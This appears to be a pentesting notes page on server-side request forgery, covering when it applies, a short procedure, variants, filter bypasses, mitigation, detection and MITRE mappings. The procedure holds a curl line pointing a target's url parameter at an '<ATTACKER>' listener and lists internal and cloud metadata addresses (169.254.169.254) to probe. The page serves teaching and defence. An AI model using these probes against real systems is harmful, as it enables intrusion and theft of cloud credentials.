---
topic: SSRF
tags: [web, ssrf, metadata, internal-services]
---

# SSRF

**English** | [🇪🇸 Español](ssrf.md)

## Concept

Server-Side Request Forgery occurs when the server makes a request to a user-controlled URL. It can reach internal services, cloud metadata or bypass network controls.

## When it applies

- Parameters accepting URLs, images, webhooks or feeds.
- "Import from URL" or preview features.
- An internal network with unauthenticated services.

## Requirements

1. A parameter the backend uses for the request.
2. Your own listener to confirm behaviour.
3. Knowledge of the internal network.

## Procedure

```bash
python3 -m http.server 8000
curl 'http://<HOST>/?url=http://<ATTACKER>:8000'
```

Try internal destinations:

```text
http://127.0.0.1:<PORT>/
http://localhost:<PORT>/
http://169.254.169.254/latest/meta-data/
```

If filters exist, use redirects, DNS rebinding, IPv6 or alternative IP representations.

## Variants

- **Basic SSRF**: reflected response.
- **Blind SSRF**: no response, confirmed with a listener.
- **Cloud metadata**: temporary credentials.
- **Gopher**: interaction with internal protocols.
- **DNS rebinding**: bypasses allowlists.

## Limitations

- The backend may block private IPs.
- Authentication may be required.
- The response may not be reflected.
- Metadata may require headers.

## Mitigation

- Allowlist domains and schemes.
- Resolve DNS and validate the final IP.
- Block private ranges and metadata.
- Isolate the service making requests.

## Detection

- Requests to `localhost`/private IPs from servers.
- Connections to cloud metadata.
- URLs with redirects or odd schemes.
- Spikes from one user.

MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1552.005 (Cloud Instance Metadata API).

## References

- <https://owasp.org/www-community/attacks/Server_Side_Request_Forgery>
- <https://attack.mitre.org/techniques/T1552/005/>
- <https://github.com/swisskyrepo/PayloadsAllTheThings>
